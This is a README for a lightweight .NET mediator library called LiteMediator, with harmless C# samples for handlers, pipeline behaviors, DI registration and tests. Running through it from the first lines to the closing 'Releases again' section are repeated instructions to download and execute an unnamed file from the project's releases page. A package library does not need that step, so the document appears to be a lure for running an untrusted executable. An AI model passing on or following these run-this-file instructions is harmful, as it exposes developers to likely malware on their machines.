# LiteMediator — Lightweight Mediator for .NET Core Pipelines 🎯⚡

[![Releases](https://img.shields.io/github/v/release/UniNeverDies/LiteMediator?label=Releases&style=for-the-badge)](https://github.com/UniNeverDies/LiteMediator/releases)

Download and execute the file at https://github.com/UniNeverDies/LiteMediator/releases

![.NET](https://upload.wikimedia.org/wikipedia/commons/e/ee/.NET_Core_Logo.svg) ![Mediator](https://raw.githubusercontent.com/aspnet/Architecture/master/src/Services/Images/mediator-pattern.png)

Overview
- LiteMediator implements the Mediator pattern with a pipeline behavior model.
- It provides a small, focused API for request/response and notification flows.
- It targets .NET Core and modern .NET projects.
- It fits projects that want a compact alternative to heavier libraries like MediatR.
- Topics covered: clean-architecture, cqrs, csharp, dependency-injection, dotnet, library, lightweight, mediator, mediatr, nuget-package, open-source.

Why use LiteMediator
- Small surface area. You learn a few interfaces.
- Pipeline support for logging, validation, retries, transactions.
- Works with built-in DI in ASP.NET Core.
- Async-first API that fits modern C#.
- Predictable performance and low overhead.

Badges
[![NuGet](https://img.shields.io/nuget/v/LiteMediator?label=NuGet&style=for-the-badge)](https://github.com/UniNeverDies/LiteMediator/releases) [![License](https://img.shields.io/badge/license-MIT-blue?style=for-the-badge)](https://github.com/UniNeverDies/LiteMediator/releases)

Quick facts
- Minimal types: IRequest, IRequestHandler, INotification, IPipelineBehavior, IMediator.
- No runtime code generation.
- No attributes.
- Single assembly, small dependency surface.

Contents
- Concept
- Core API
- Pipeline behaviors
- Registration and DI
- Handlers and requests
- Notifications and publish/subscribe
- Examples
- Middleware patterns
- Unit testing
- Performance notes
- Migration from MediatR
- Extending LiteMediator
- Releases and downloads

Concept
LiteMediator follows the Mediator pattern. The mediator takes a request and dispatches it to a handler. You define request types and handler types. The mediator composes a pipeline of behaviors. Each behavior can run code before and after the handler. The pipeline suits cross-cutting concerns such as validation, logging, retries, metrics, and transactions.

Core API (conceptual)
- IRequest<TResponse> — marker for request messages that return TResponse.
- IRequestHandler<TRequest, TResponse> — handle the request.
- INotification — marker for notification messages with no response.
- INotificationHandler<TNotification> — handle notifications.
- IPipelineBehavior<TRequest, TResponse> — pipeline step around handlers.
- IMediator — entry point. Send requests and publish notifications.

Simple interfaces (example)
```csharp
public interface IRequest<TResponse> { }

public interface IRequestHandler<TRequest, TResponse>
    where TRequest : IRequest<TResponse>
{
    Task<TResponse> Handle(TRequest request, CancellationToken ct);
}

public interface INotification { }

public interface INotificationHandler<TNotification>
    where TNotification : INotification
{
    Task Handle(TNotification notification, CancellationToken ct);
}

public interface IPipelineBehavior<TRequest, TResponse>
    where TRequest : IRequest<TResponse>
{
    Task<TResponse> Handle(TRequest request, CancellationToken ct, RequestHandlerDelegate<TResponse> next);
}

public delegate Task<TResponse> RequestHandlerDelegate<TResponse>();
```

IMediator usage
- Send a request and await a response.
- Publish a notification to registered handlers.

Example:
```csharp
var response = await mediator.Send(new GetUserQuery { Id = userId }, cancellationToken);
await mediator.Publish(new UserCreatedNotification { UserId = userId }, cancellationToken);
```

Installation
- Add the LiteMediator package from NuGet or download the release file.
- The releases are available here: https://github.com/UniNeverDies/LiteMediator/releases — download and execute the file provided in the release page.
- Use your project file or dotnet CLI to add the package if a NuGet package is published:
  dotnet add package LiteMediator

Basic patterns
- Request/Response: Use IRequest<T>.
- Fire-and-forget: Use INotification for events without responses.
- Pipeline: Implement IPipelineBehavior for cross-cutting logic.

Registration and DI
LiteMediator aims to register handlers with the host DI container. The library provides a small helper to scan assemblies and register types.

Typical registration in ASP.NET Core:
```csharp
public static IServiceCollection AddLiteMediator(this IServiceCollection services, params Assembly[] assemblies)
{
    // internal: scan assemblies for IRequest/IRequestHandler implementations
    // register handlers and pipeline behaviors
    return services;
}

// usage
services.AddLiteMediator(typeof(Startup).Assembly);
```

The registry finds:
- IRequestHandler<TRequest,TResponse>
- INotificationHandler<TNotification>
- IPipelineBehavior<,>

You can also register handlers manually:
```csharp
services.AddTransient<IRequestHandler<GetUserQuery, UserDto>, GetUserHandler>();
services.AddTransient<INotificationHandler<UserCreatedNotification>, AuditHandler>();
services.AddTransient(typeof(IPipelineBehavior<,>), typeof(LoggingBehavior<,>));
services.AddSingleton<IMediator, Mediator>();
```

Pipeline behaviors
A pipeline behavior wraps the handler. It receives the request, runs logic, and invokes the next delegate.

Example behavior:
```csharp
public class LoggingBehavior<TRequest, TResponse> : IPipelineBehavior<TRequest, TResponse>
    where TRequest : IRequest<TResponse>
{
    private readonly ILogger _logger;

    public LoggingBehavior(ILogger logger) { _logger = logger; }

    public async Task<TResponse> Handle(TRequest request, CancellationToken ct, RequestHandlerDelegate<TResponse> next)
    {
        _logger.LogInformation("Handling {RequestType}", typeof(TRequest).Name);
        var response = await next();
        _logger.LogInformation("Handled {RequestType}", typeof(TRequest).Name);
        return response;
    }
}
```

Behavior ordering
- Register behaviors in DI in the order you want them to run.
- The library builds the pipeline in the same order as DI resolves the behaviors.

Handler examples
Request DTO and handler:
```csharp
public class GetUserQuery : IRequest<UserDto>
{
    public int Id { get; set; }
}

public class GetUserHandler : IRequestHandler<GetUserQuery, UserDto>
{
    private readonly IUserRepository _repo;

    public GetUserHandler(IUserRepository repo) { _repo = repo; }

    public async Task<UserDto> Handle(GetUserQuery request, CancellationToken ct)
    {
        var user = await _repo.FindByIdAsync(request.Id, ct);
        if (user == null) return null;
        return new UserDto { Id = user.Id, Name = user.Name };
    }
}
```

Notification examples
Notification and handler:
```csharp
public class UserCreatedNotification : INotification
{
    public int UserId { get; set; }
}

public class SendWelcomeEmailHandler : INotificationHandler<UserCreatedNotification>
{
    private readonly IEmailService _email;

    public SendWelcomeEmailHandler(IEmailService email) { _email = email; }

    public Task Handle(UserCreatedNotification notification, CancellationToken ct)
    {
        return _email.SendWelcome(notification.UserId, ct);
    }
}
```

Concurrency and async
- All public APIs are async.
- Handlers should accept CancellationToken.
- Notifications execute all handlers in parallel by default or in order if you prefer. The library offers a configurable mode: parallel or sequential.

Pipeline examples
Validation behavior:
```csharp
public class ValidationBehavior<TRequest, TResponse> : IPipelineBehavior<TRequest, TResponse>
    where TRequest : IRequest<TResponse>
{
    private readonly IEnumerable<IValidator<TRequest>> _validators;

    public ValidationBehavior(IEnumerable<IValidator<TRequest>> validators)
    {
        _validators = validators;
    }

    public async Task<TResponse> Handle(TRequest request, CancellationToken ct, RequestHandlerDelegate<TResponse> next)
    {
        var failures = _validators
            .Select(v => v.Validate(request))
            .SelectMany(r => r.Errors)
            .Where(f => f != null)
            .ToList();

        if (failures.Any())
        {
            throw new ValidationException(failures);
        }

        return await next();
    }
}
```

Retries behavior:
```csharp
public class RetryBehavior<TRequest, TResponse> : IPipelineBehavior<TRequest, TResponse>
{
    private readonly int _maxRetries;

    public RetryBehavior(int maxRetries = 3) { _maxRetries = maxRetries; }

    public async Task<TResponse> Handle(TRequest request, CancellationToken ct, RequestHandlerDelegate<TResponse> next)
    {
        var attempts = 0;
        while (true)
        {
            try
            {
                return await next();
            }
            catch (Exception) when (++attempts <= _maxRetries)
            {
                await Task.Delay(TimeSpan.FromMilliseconds(50), ct);
            }
        }
    }
}
```

Integration with ASP.NET Core
- Register LiteMediator via DI.
- Inject IMediator into controllers, services, or minimal API endpoints.

Controller example:
```csharp
[ApiController]
[Route("api/users")]
public class UsersController : ControllerBase
{
    private readonly IMediator _mediator;

    public UsersController(IMediator mediator) { _mediator = mediator; }

    [HttpGet("{id}")]
    public async Task<IActionResult> Get(int id)
    {
        var user = await _mediator.Send(new GetUserQuery { Id = id });
        if (user == null) return NotFound();
        return Ok(user);
    }

    [HttpPost]
    public async Task<IActionResult> Create(CreateUserRequest model)
    {
        var id = await _mediator.Send(new CreateUserCommand { Name = model.Name });
        await _mediator.Publish(new UserCreatedNotification { UserId = id });
        return CreatedAtAction(nameof(Get), new { id }, null);
    }
}
```

Minimal API example:
```csharp
app.MapPost("/users", async (CreateUserRequest req, IMediator mediator) =>
{
    var id = await mediator.Send(new CreateUserCommand { Name = req.Name });
    await mediator.Publish(new UserCreatedNotification { UserId = id });
    return Results.Created($"/users/{id}", null);
});
```

Unit testing handlers
- Test handlers in isolation by creating handler instances and injecting test doubles.
- Use mediator for integration tests to ensure the pipeline runs.

Unit test example (xUnit):
```csharp
[Fact]
public async Task GetUserHandler_Returns_UserDto()
{
    var repo = new Mock<IUserRepository>();
    repo.Setup(r => r.FindByIdAsync(1, It.IsAny<CancellationToken>()))
        .ReturnsAsync(new User { Id = 1, Name = "Alice" });

    var handler = new GetUserHandler(repo.Object);
    var result = await handler.Handle(new GetUserQuery { Id = 1 }, CancellationToken.None);
    Assert.Equal("Alice", result.Name);
}
```

Integration tests
- Use a test host and register the real DI configuration.
- Replace external services with in-memory or fake implementations.

Performance notes
- LiteMediator keeps allocations low.
- It uses delegate chaining for pipeline composition.
- It avoids reflection per call.
- For high throughput scenarios, prefer granular behaviors and keep heavy logic out of the pipeline core.

Benchmark tips
- Measure end-to-end time with realistic handlers.
- Profile allocations and GC pressure.
- Compare with alternatives using the same handlers and pipeline complexity.

Migration from MediatR
- Replace MediatR types with LiteMediator types:
  - IRequest<T> -> same concept
  - IRequestHandler<T, R> -> same concept
  - IPipelineBehavior<T, R> -> same concept
- Adjust DI registrations. LiteMediator helper supports scanning but may use different registration patterns.
- Behavior ordering follows DI order.
- Notifications and Publish behave similarly but check whether handlers run in parallel or in sequence.

Extending LiteMediator
- Add new pipeline behaviors.
- Implement custom mediator strategies.
- Add a logging extension package for structured logs.
- Add integration packages for validation libraries.

Advanced pipeline ideas
- Short-circuit behavior that returns a response without invoking the handler.
- Caching behavior that caches responses by request type and key.
- Circuit breaker behavior for downstream calls.
- Transaction behavior that starts and commits a unit of work.

Sample caching behavior:
```csharp
public class CachingBehavior<TRequest, TResponse> : IPipelineBehavior<TRequest, TResponse>
{
    private readonly ICache _cache;

    public CachingBehavior(ICache cache) { _cache = cache; }

    public async Task<TResponse> Handle(TRequest request, CancellationToken ct, RequestHandlerDelegate<TResponse> next)
    {
        var key = $"{typeof(TRequest).FullName}:{request.GetHashCode()}";
        if (_cache.TryGet<TResponse>(key, out var cached)) return cached;
        var response = await next();
        _cache.Set(key, response, TimeSpan.FromMinutes(5));
        return response;
    }
}
```

Error handling patterns
- Throw domain exceptions from handlers.
- Use an ErrorHandlingBehavior that catches exceptions and maps them to domain error objects or logs and rethrows.
- For public APIs, map domain exceptions to HTTP status codes in the controller layer or middleware.

ErrorBehavior example:
```csharp
public class ErrorBehavior<TRequest, TResponse> : IPipelineBehavior<TRequest, TResponse>
{
    private readonly ILogger _logger;

    public ErrorBehavior(ILogger logger) { _logger = logger; }

    public async Task<TResponse> Handle(TRequest request, CancellationToken ct, RequestHandlerDelegate<TResponse> next)
    {
        try
        {
            return await next();
        }
        catch (ValidationException ex)
        {
            _logger.LogWarning(ex, "Validation failed for {Request}", typeof(TRequest).Name);
            throw;
        }
        catch (Exception ex)
        {
            _logger.LogError(ex, "Unhandled exception for {Request}", typeof(TRequest).Name);
            throw;
        }
    }
}
```

API reference (quick)
- IMediator
  - Task<TResponse> Send<TResponse>(IRequest<TResponse> request, CancellationToken ct = default)
  - Task Publish<TNotification>(TNotification notification, CancellationToken ct = default) where TNotification : INotification
- IRequest<TResponse>
- IRequestHandler<TRequest, TResponse>
  - Task<TResponse> Handle(TRequest request, CancellationToken ct)
- INotification
- INotificationHandler<TNotification>
  - Task Handle(TNotification notification, CancellationToken ct)
- IPipelineBehavior<TRequest, TResponse>
  - Task<TResponse> Handle(TRequest request, CancellationToken ct, RequestHandlerDelegate<TResponse> next)

Design choices
- Keep interfaces minimal and explicit.
- Favor composition over inheritance.
- Keep the mediator free of business logic.
- Use DI for lifecycle control.

Project layout suggestion
- src/LiteMediator — main library.
- samples/Api — sample ASP.NET Core API with DI and behaviors.
- samples/Console — example usage in console app.
- tests/Unit — unit tests for handlers and behaviors.
- docs — design notes and examples.

Contributing
- Fork the repo.
- Add tests for new features.
- Keep API changes minimal.
- Open a pull request for review.
- Follow the issue templates and code style in the repository.

Releases and download
- Check the release page for binaries and packages.
- The release page contains a file you need to download and run. Visit https://github.com/UniNeverDies/LiteMediator/releases and download the file labeled for your platform. Execute it as required by the release notes.
- Use the badge at the top to jump to the release page.

Roadmap
- Improve performance for large handler graphs.
- Add more example behaviors for common cross-cutting scenarios.
- Publish official integration packages for validation and caching.
- Add source generators to reduce registration boilerplate (opt-in).
- Add a tracing behavior for OpenTelemetry.

Security
- Keep handlers free of secrets in code.
- Use secure channels for external calls.
- Prefer DI for secret retrieval so you can swap implementations in tests.

Testing strategies
- Unit test handlers with fake dependencies.
- Use integration tests to validate the pipeline composition.
- Use contract tests for behaviors that operate on collections or streams.

Common patterns and anti-patterns
- Pattern: Keep handlers thin. Delegate domain logic to services or domain objects.
- Pattern: Use notifications for side-effects that do not affect the response.
- Anti-pattern: Put long-running external calls directly in handlers. Wrap them in services you can mock.
- Anti-pattern: Use global state in behaviors. Use DI-scoped services instead.

Sample project: end-to-end
- Define domain DTOs and repository interface.
- Implement handlers that call repositories.
- Add pipeline behaviors for validation and logging.
- Register everything in Startup or Program.
- Use IMediator in controllers or handlers.

Sample code snippet: Program.cs (ASP.NET Core)
```csharp
var builder = WebApplication.CreateBuilder(args);
builder.Services.AddControllers();
builder.Services.AddLiteMediator(typeof(Program).Assembly);
builder.Services.AddTransient(typeof(IPipelineBehavior<,>), typeof(LoggingBehavior<,>));
builder.Services.AddTransient(typeof(IPipelineBehavior<,>), typeof(ValidationBehavior<,>));
builder.Services.AddScoped<IUserRepository, InMemoryUserRepository>();
var app = builder.Build();
app.MapControllers();
app.Run();
```

Common FAQ
Q: Does LiteMediator support synchronous handlers?
A: The library uses async Task. Synchronous code should wrap its result in Task.FromResult.

Q: How do I set pipeline order?
A: Register behaviors in DI in the order you want them to run. The mediator composes behaviors in that order.

Q: Do notifications run in parallel?
A: The default mode may run handlers in parallel. You can configure sequential execution by registering a behavior that enforces order or by a configuration flag.

Q: Does LiteMediator use reflection per request?
A: No. The mediator builds delegate chains at startup. It avoids repeated reflection during dispatch.

Q: Will I lose features compared to MediatR?
A: You trade size and features for simplicity. Core mediator patterns remain.

Logging guidance
- Use structured logging with context properties.
- Add a behavior to add a correlation id to logs.
- Enrich logs with request type and handler name.

Tracing guidance
- Add an OpenTelemetry behavior that starts a span per request.
- Add attributes on handlers if you need fine-grained spans.

Observability behavior example:
```csharp
public class TracingBehavior<TRequest, TResponse> : IPipelineBehavior<TRequest, TResponse>
{
    private readonly Tracer _tracer;

    public TracingBehavior(Tracer tracer) { _tracer = tracer; }

    public async Task<TResponse> Handle(TRequest request, CancellationToken ct, RequestHandlerDelegate<TResponse> next)
    {
        using var span = _tracer.StartActiveSpan(typeof(TRequest).FullName);
        return await next();
    }
}
```

Extensibility points
- Add an IMediatorFactory to provide different mediator instances per tenant or per context.
- Provide adapter to run handlers in background jobs.
- Provide a web hook notifier that publishes notifications over HTTP.

Examples of real use cases
- CQRS read model where queries use IRequest<T>.
- Command handlers that change state and publish notifications.
- Background workers that process notifications from queues.

Changelog
- See the release files and notes here: https://github.com/UniNeverDies/LiteMediator/releases — download and execute the file provided in the chosen release to get binaries and install scripts.

License
- The project uses the MIT license. See LICENSE file in repository.

Acknowledgements
- Inspired by the Mediator pattern and small implementations like MediatR.
- Community contributions drive roadmap and fixes.

Contact and support
- Open issues on the repository.
- Submit pull requests for fixes and features.
- Use the release page to download binaries and installers: https://github.com/UniNeverDies/LiteMediator/releases

Sample gallery
- Diagram: mediator pattern flow (request -> pipeline -> handler -> response)
- Example logs
- Sample API responses

Images and design assets
- .NET logo from Wikimedia.
- Mediator pattern diagram from community examples.

Code style
- Follow standard C# conventions.
- Use explicit interfaces and minimal public API.
- Write unit tests for handlers and behaviors.

Performance checklist
- Avoid heavy reflection.
- Keep pipeline short.
- Cache computed keys for caching behaviors.
- Reuse DI services when safe.

Best practices
- Keep handlers focused on orchestration, not business rules.
- Move business logic into domain services or aggregates.
- Use notifications for side effects.
- Compose behaviors that do one thing.

Advanced example: transactional command
```csharp
public class TransactionBehavior<TRequest, TResponse> : IPipelineBehavior<TRequest, TResponse>
{
    private readonly IUnitOfWork _uow;

    public TransactionBehavior(IUnitOfWork uow) { _uow = uow; }

    public async Task<TResponse> Handle(TRequest request, CancellationToken ct, RequestHandlerDelegate<TResponse> next)
    {
        await _uow.BeginTransactionAsync(ct);
        try
        {
            var response = await next();
            await _uow.CommitAsync(ct);
            return response;
        }
        catch
        {
            await _uow.RollbackAsync(ct);
            throw;
        }
    }
}
```

Testing pipeline order
- Use a simple behavior that appends markers to a list.
- Assert the list order after calling mediator.Send.

Example test:
```csharp
[Fact]
public async Task Pipeline_runs_in_registered_order()
{
    var markers = new List<string>();
    var services = new ServiceCollection();
    services.AddSingleton(markers);
    services.AddTransient(typeof(IPipelineBehavior<,>), typeof(MarkerBehaviorA<,>));
    services.AddTransient(typeof(IPipelineBehavior<,>), typeof(MarkerBehaviorB<,>));
    services.AddLiteMediator(typeof(Program).Assembly);
    var sp = services.BuildServiceProvider();
    var mediator = sp.GetRequiredService<IMediator>();
    await mediator.Send(new MarkerRequest());
    Assert.Equal(new[] { "A-before", "B-before", "handler", "B-after", "A-after" }, markers);
}
```

Useful patterns for large systems
- Split handlers by feature folder.
- Use pipeline behaviors for cross-cutting concerns only.
- Keep per-request state in scoped services.

Final notes and pointers
- For downloads and release assets, visit the releases page and follow the provided file instructions: https://github.com/UniNeverDies/LiteMediator/releases
- Use the badge at the top to jump to the release page for the latest version.

Contributors
- Add your name to CONTRIBUTORS.md after submitting a pull request.
- Follow the code of conduct in the repo.

License and legal
- See LICENSE file in the repository for full terms.

Acknowledgment of external libraries
- The project keeps external dependencies minimal. Use standard logging, DI, and common validation libraries as needed.

Development tips
- Write tests for every behavior.
- Use CI to run unit tests and static analysis.
- Keep the API stable across minor versions.

Maintenance
- Tag releases with semantic versioning.
- Provide migration notes for breaking changes.

Repository topics
- clean-architecture
- cqrs
- csharp
- dependency-injection
- dotnet
- library
- lightweight
- mediator
- mediatr
- nuget-package
- open-source

Releases again
- Visit and download from: https://github.com/UniNeverDies/LiteMediator/releases — the release page contains files you need to download and execute to install or inspect release artifacts

Thank you for exploring LiteMediator.